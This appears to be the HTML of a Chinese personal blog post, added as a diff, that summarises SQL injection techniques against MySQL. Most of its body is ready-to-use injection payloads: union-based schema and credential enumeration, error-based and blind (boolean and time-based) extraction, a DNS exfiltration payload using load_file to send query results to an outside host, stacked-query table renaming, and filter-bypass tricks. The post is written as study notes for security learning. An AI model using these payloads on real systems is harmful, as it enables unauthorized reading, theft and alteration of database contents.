@@ -1,0 +1,1415 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="sql注入, Lees&#39;s Blog">
+    <meta name="description" content="​    本文是对sql注入的总结和回顾,本文的sql语句（无特别描述的）都是基于MySQL数据库的。
+什么是sql注入​    Sql注入允许攻击者扰乱对数据库的查询，从而让攻击者查看到正常情况下看不到的数据，甚至删除或修改这些数据。
+
+">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>sql注入 | Lees&#39;s Blog</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="alternate" href="/atom.xml" title="Lees's Blog" type="application/atom+xml">
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Lees&#39;s Blog</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fa fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fa fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fa fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fa fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fa fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fa fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Lees&#39;s Blog</div>
+        <div class="logo-desc">
+            
+            没有目的，就做不成任何事情
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fa fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">sql注入</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                <span class="chip bg-color">sql注入</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E6%B3%A8%E5%85%A5/" class="post-category">
+                                注入
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2021-09-08
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    2.6k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    10 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>​    本文是对sql注入的总结和回顾,本文的sql语句（无特别描述的）都是基于MySQL数据库的。</p>
+<h2 id="什么是sql注入"><a href="#什么是sql注入" class="headerlink" title="什么是sql注入"></a>什么是sql注入</h2><p>​    Sql注入允许攻击者扰乱对数据库的查询，从而让攻击者查看到正常情况下看不到的数据，甚至删除或修改这些数据。</p>
+<span id="more"></span>
+
+<h2 id="sql注入分类"><a href="#sql注入分类" class="headerlink" title="sql注入分类"></a>sql注入分类</h2><ol>
+<li><p>按注入形式分</p>
+<ul>
+<li>联合注入</li>
+<li>报错注入</li>
+<li>盲注<ul>
+<li>布尔注入</li>
+<li>时间注入</li>
+</ul>
+</li>
+<li>dns注入</li>
+<li>堆叠注入</li>
+<li>宽字节注入</li>
+</ul>
+</li>
+<li><p>按注入点分</p>
+<ul>
+<li>get注入</li>
+<li>post注入</li>
+<li>cookie注入</li>
+<li>header注入</li>
+</ul>
+</li>
+</ol>
+<h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>length(string)</td>
+<td>返回string的长度</td>
+</tr>
+<tr>
+<td>substr(string,start_position,length)</td>
+<td>可以从start_position位置开始，取长度为length的子字符串，</td>
+</tr>
+<tr>
+<td>left(string,length)</td>
+<td>取最左边的length个字符</td>
+</tr>
+<tr>
+<td>right(string,length)</td>
+<td>取最右边的length个字符</td>
+</tr>
+<tr>
+<td>concat(str1,str2,……)</td>
+<td>将多个字符串连接成一个字符串。</td>
+</tr>
+<tr>
+<td>ascii(char)</td>
+<td>获取字符的ascii码，如果是要给字符串那么就取第一个字符的</td>
+</tr>
+<tr>
+<td>char(num)</td>
+<td>将ascii码转换为字符。为介于 0 和 255 之间的整数。</td>
+</tr>
+<tr>
+<td>nchar(integer_expression)</td>
+<td>将unicode编码转换为字符。为介于 0 和 255 之间的整数。</td>
+</tr>
+<tr>
+<td>sleep(second)</td>
+<td>延迟多少秒。</td>
+</tr>
+<tr>
+<td>if(expr1,expr2,expr3)</td>
+<td>其实准确来说这是一个表达式。如果expr1成立就返回expr2，否则就返回expr3。</td>
+</tr>
+<tr>
+<td>updatexml(需要替换的xml文档，xpath路径，替换内容)</td>
+<td>通过xpath路径在需要替换的文档中进行定位，然后替换成替换内容</td>
+</tr>
+<tr>
+<td>extractvalue(目标xml文档，xml路径)</td>
+<td>对XML文档进行查询的函数，可以用来进行报错注</td>
+</tr>
+</tbody></table>
+<h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h3><p>​    在介绍union注入之前，先介绍下union查询，union的作用是将两个SQL语句进行联合。<br>例如</p>
+<pre class=" language-mysql"><code class="language-mysql">SELECT a,b FROM table1 UNION SELECT c,d FROM table2
+</code></pre>
+<p>union的查询需要满足两个条件</p>
+<ul>
+<li>每个查询都需要返回相同的列数</li>
+<li>每列中的数据类型在各个查询之间必须兼容（NULL值可以和任何数据类型兼容）</li>
+</ul>
+<p>因此在union注入之前我们得先得到表的列数有两种方法<br>第一种是利用order by子句，从1开始自增直至报错,然后确定回显点</p>
+<pre class=" language-mysql"><code class="language-mysql">' union select 1,2,3 --  （假设是3列）
+</code></pre>
+<p>第二种是在union查询中设置不同数量的NULL值字段，直到不报错，然后再测试是啥类型的数据，一列一列的尝试直到收到正常响应，即代表那个位置是可以存放字符串的,例如我们可以这样构造payload：</p>
+<pre class=" language-mysql"><code class="language-mysql">' UNION SELECT 'a',NULL,NULL,NULL-- 
+
+' UNION SELECT NULL,'a',NULL,NULL-- 
+</code></pre>
+<p>接下来就是获取数据了,这里利用<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lyftest/p/8034470.html">information_schema数据库</a><br>获取所有数据库</p>
+<pre class=" language-mysql"><code class="language-mysql">' union select 1,schema_name,3 from information_schema.schemata #
+</code></pre>
+<p>获取某一数据库的所有表</p>
+<pre class=" language-mysql"><code class="language-mysql">' union select 1,table_name,3 from information_schema.tables where table_schema='ku_ming'#
+</code></pre>
+<p>获取某一数据库的某一张表的所有字段名</p>
+<pre class=" language-mysql"><code class="language-mysql">' union select 1,column_name,3 from information_schema.columns where table_schema='ku_ming' and table_name='biao_ming' #
+</code></pre>
+<p>接下来直接查询想要的数据就可以了</p>
+<p>在我们需要将多列结果返回成一列时可以这样构造payload</p>
+<pre class=" language-mysql"><code class="language-mysql">' UNION SELECT username || '~' || password FROM users-- 
+</code></pre>
+<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>平时我们最常用到的三种报错注入方式分别是：floor()、updatexml()、extractvalue()。</p>
+<p>流程，这里以updatexml为例</p>
+<p>判断是否可以报错注入</p>
+<pre class=" language-mysql"><code class="language-mysql">'and updatexml(1,concat(0x7e,(select user()),0x7e),1) --+
+//0x7e是~ 的16进制ASCII码，
+
+id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));
+//extractvalue()从目标xml中返回包含所查询值的字符串
+
+id=1 and exp(~(select * from(select user())a));
+//当传递一个大于709的值时，函数exp()就会引起一个溢出错误
+
+id=1 and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a);
+floor()是MySQL的一个取整函数
+</code></pre>
+<p>之后的注入只要修改select user() 语句就行了</p>
+<p>更多报错方法移步移步<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a><br>还有一种触发报错的姿势</p>
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注是啥？就是你看不到注入的结果，只能通过页面返回的区别来区分</p>
+<h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><pre class=" language-mysql"><code class="language-mysql">'and '1'='1
+'and '1'='2
+</code></pre>
+<p>例如通过这两个语句一般就可以得到它不同的响应，再根据区别写脚本，或用bp去爆破<br>具体可以看这里<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/245532#h3-28">https://www.anquanke.com/post/id/245532#h3-28</a></p>
+<p>当返回结果无论如何都一样时，这时可以用时间注入。</p>
+<h3 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h3><p>举例</p>
+<pre class=" language-mysql"><code class="language-mysql">1' and (if(ascii(substr(database(),1,1))>100,sleep(10),sleep(4))  --+ 
+</code></pre>
+<p>根据页面的返回时间来判断</p>
+<h3 id="dns注入"><a href="#dns注入" class="headerlink" title="dns注入"></a>dns注入</h3><p>在大多数应用系统，都会允许dns流量的出入，所以我们可以利用DNS流量将注入结果发送到我们外部网络的接收客户端。<br>此注入需要有个dns域名，我们可以用burp内的Burp Collaborator工具，或者dnslog等<br>举例</p>
+<pre class=" language-mysql"><code class="language-mysql">and (select load_file(concat('//',(select database()),'.xxxxxxxx.ceye.io/abc')))
+</code></pre>
+<p>漏洞限制<br>限制在windows系统，因为原理是利用了load_file在windows中读取文件利用到了资源管理器（可能不准确，未具体研究，但是能和资源管理器进行相同一个DNS查询操作，这个官方文档中并未提及）<br>在mysql5.5.53之前，参数secure_file_priv一直是为空可以任意进行读取，在我的测试中，之后的mysql版本已经对此有所限制（目录限制，没法随意读取文件）<br>漏洞的利用点不一定停留在数据库（更不限于mysql），如果你能换起windows的资源管理器，就可以成功利用这个dns通道查询传输信息</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>通过;分隔来执行多条语句<br>一般如果要使用到堆叠注入的话，select都已经被屏蔽了。如果没有屏蔽直接使用select语句进行查询就是了。接下来重点说在各种屏蔽的情况下怎么绕过</p>
+<ul>
+<li>预编译<br>&#96;&#96;&#96;mysql</li>
+</ul>
+<p>-1’;set @sql &#x3D; CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);prepare stmt from @sql;EXECUTE stmt;#<br>拆开看：<br>    set @sql &#x3D; CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>        通过concat来讲select拼接，以绕过过滤，然后讲破解的字符串赋值给了变量@sql<br>    prepare stmt from @sql;<br>        将@sql编译了之后的结果给stmt。<br>    EXECUTE stmt;#<br>        运行编译后的结果<br>流程：拼接sql语句-&gt;编译sql语句-&gt;运行编译后的结果</p>
+<pre><code>- 偷梁换柱
+```mysql
+1&#39;; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
+
+表 words是我们访问页面时默认正常访问的数据表
+表 1919810931114514是存放flag的数据表
+
+alter table words rename to words1; 
+    那么我们直接将words重命名为其它表
+alter table `1919810931114514` rename to words; 
+    然后将1919810931114514表命名为words不就是了。这样一来我们正常输入数据的时候直接是访问1919810931114514里面的数据了。
+alter table words change flag id varchar(50);#
+    当然我们还要将1919810931114514里的字段名也改为words的字段名才行。将字段名flag改为id
+当然如果之前是通过提交1或在2这样的数字来获取值的。现在这里面的类型变了。
+所以我们得使用1&#39; or 1=1#使得无论无何都返回第一条数据。
+</code></pre>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>参考资料：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43264067/article/details/105945059">宽字节注入</a><br>原理：由于魔术引号函数的存在magic_quotes_gpc(开关)，会自动在’ “ \等前面加上一个\导致sql语句闭合不了，这时候我们就需要输入一些字符，让数据库实现误判，让转义字符\和我们输入的语句组成一个新的汉字来闭合语句。</p>
+<p>mysql_real_escape_string()转义 SQL 语句中使用的字符串中的特殊字符，也可宽字节绕过，防御设置编码为gbk，Mysql_set_charset(‘gbk’,’$conn’)</p>
+<p>注意：使用 addslashes(),我们需要将 mysql_query 设置为 binary 的方式，才能防御宽字节漏洞。<br>Mysql_query(“SET character_set_connection&#x3D;gbk,character_set_result&#x3D;gbk,character_set_client&#x3D;binary”,$conn);</p>
+<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><pre class=" language-php"><code class="language-php"><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/select|union/'</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>正则不区分大小写,大小写穿插绕过</p>
+<h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><pre class=" language-php"><code class="language-php"><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/select|union/i'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</code></pre>
+<p>正则匹配到select或union则替换为空，只会进行一次替换，可以双写绕过</p>
+<h3 id="被过滤"><a href="#被过滤" class="headerlink" title="#被过滤"></a>#被过滤</h3><p>用–+、– 、&#96;、;、&#x2F;**&#x2F;</p>
+<h3 id="x3D-被过滤"><a href="#x3D-被过滤" class="headerlink" title="&#x3D;被过滤"></a>&#x3D;被过滤</h3><p>用like、rlike、regex</p>
+<h3 id="被过滤-1"><a href="#被过滤-1" class="headerlink" title=",被过滤"></a>,被过滤</h3><p>无法替换，用其他函数来绕过</p>
+<pre class=" language-mysql"><code class="language-mysql">union select 1,2#
+等价于
+union select * from (select 1)a join (select 2)b#
+同理(select 2)b 等效于select 2 as b
+
+select * from users limit 0,1#
+等价于
+select * from users limit 1 offset 0#
+
+and ascii(mid((database()),1,1))=1#
+等价于
+and ascii(mid((database())from 1 for 1))=1#   
+使用substr和mid可以用这个来绕过
+</code></pre>
+<h3 id="引号被过滤"><a href="#引号被过滤" class="headerlink" title="引号被过滤"></a>引号被过滤</h3><p>使用十六进制</p>
+<pre class=" language-mysql"><code class="language-mysql">select column_name  from information_schema.tables where table_name=0x7573657273  # "users" 的十六进制为 0x7573657273
+</code></pre>
+<h3 id="sleep-过滤"><a href="#sleep-过滤" class="headerlink" title="sleep()过滤"></a>sleep()过滤</h3><p>用benchmark()函数代替<br>benchmark()重复执行前面一个表达式</p>
+<pre class=" language-mysql"><code class="language-mysql">id=1' and benchmark(1000000000,1)#    不知道前一个表达式的执行时间，所以要反复调整，改0的个数就行
+</code></pre>
+<h3 id="substr过滤"><a href="#substr过滤" class="headerlink" title="substr过滤"></a>substr过滤</h3><p>用substring()和mid()函数代替</p>
+<pre class=" language-mysql"><code class="language-mysql">id=1' and substring(database(),1,1)='d'#
+</code></pre>
+<p>也可以用left()和right()</p>
+<h3 id="逻辑运算符绕过"><a href="#逻辑运算符绕过" class="headerlink" title="逻辑运算符绕过"></a>逻辑运算符绕过</h3><p>一般情况，and、&amp;&amp;、or、||、xor只要有一个没有被禁用我们就可以用来判断注入点</p>
+<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>用双空格、&#x2F;**&#x2F;、使用括号、用回车代替、tab代替、括号、url编码(burp抓包改空格为%a0)</p>
+<h3 id="select被过滤"><a href="#select被过滤" class="headerlink" title="select被过滤"></a>select被过滤</h3><p>穿插内联注释符、用 show + 堆叠注入来查询、<br>用 handler + 堆叠注入来查询——handler biao open;handler biao read [first|next|prev|last];handler biao close;</p>
+<h2 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h2><h3 id="字符串连接"><a href="#字符串连接" class="headerlink" title="字符串连接"></a>字符串连接</h3><p>您可以将多个字符串连接在一起以形成单个字符串。</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td>‘foo’||’bar’</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>‘foo’+’bar’</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>‘foo’||’bar’</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>‘foo’ ‘bar’ [注意两个字符串之间的空格] <br />CONCAT(‘foo’,’bar’)</td>
+</tr>
+</tbody></table>
+<h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td>SUBSTR(‘foobar’, 4, 2)</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>SUBSTRING(‘foobar’, 4, 2)</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SUBSTRING(‘foobar’, 4, 2)</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>SUBSTRING(‘foobar’, 4, 2)</td>
+</tr>
+</tbody></table>
+<h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td>–comment</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>–comment <br />&#x2F;*comment*&#x2F;</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>–comment <br />&#x2F;*comment*&#x2F;</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>#comment <br />– comment [注意双破折号后面的空格] <br />&#x2F;*comment*&#x2F;</td>
+</tr>
+</tbody></table>
+<h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h3><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td>SELECT banner FROM v$version <br />SELECT version FROM v$instance</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>SELECT @@version</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SELECT version()</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>SELECT @@version</td>
+</tr>
+</tbody></table>
+<h3 id="数据库内容"><a href="#数据库内容" class="headerlink" title="数据库内容"></a>数据库内容</h3><table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>表达式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Oracle</td>
+<td>SELECT * FROM all_tables <br />SELECT * FROM all_tab_columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td>
+</tr>
+<tr>
+<td>Microsoft</td>
+<td>SELECT * FROM information_schema.tables <br />SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SELECT * FROM information_schema.tables <br />SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>SELECT * FROM information_schema.tables <br />SELECT * FROM information_schema.columns WHERE table_name &#x3D; ‘TABLE-NAME-HERE’</td>
+</tr>
+</tbody></table>
+<p>还有许多附上链接了</p>
+<p>链接：<a target="_blank" rel="noopener" href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Lees</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lees01.gitee.io/2021/09/08/sql-zhu-ru/">https://lees01.gitee.io/2021/09/08/sql-zhu-ru/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Lees</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/sql%E6%B3%A8%E5%85%A5/">
+                                    <span class="chip bg-color">sql注入</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2021/09/29/wen-jian-bao-han-shang-chuan/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="文件包含&amp;上传">
+                        
+                        <span class="card-title">文件包含&amp;上传</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            文件包含漏洞发现
+引用本站&#x2F;外站文件的某个功能点
+找到传递的参数（get、post），查看其是否有包含关系
+
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2021-09-29
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-%E4%B8%8A%E4%BC%A0/" class="post-category">
+                                    文件包含&上传
+                                </a>
+                            
+                            
